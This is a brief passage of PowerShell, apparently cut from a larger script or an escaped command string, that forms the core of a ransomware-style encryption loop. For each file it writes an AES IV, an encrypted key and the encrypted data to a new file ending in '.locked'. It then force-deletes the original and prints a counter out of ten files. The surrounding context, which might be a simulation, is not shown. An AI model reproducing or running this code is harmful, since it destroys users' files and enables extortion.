  $output = $aes.IV + $encKey + $encData;
  [IO.File]::WriteAllBytes(\"$($f.FullName).locked\", $output);
  Remove-Item $f.FullName -Force;
  $encrypted++;
  Write-Host \"  [$encrypted/10] $($f.Name) → $($f.Name).locked ($([math]::Round($output.Length/1KB,1)) KB)\";
}"

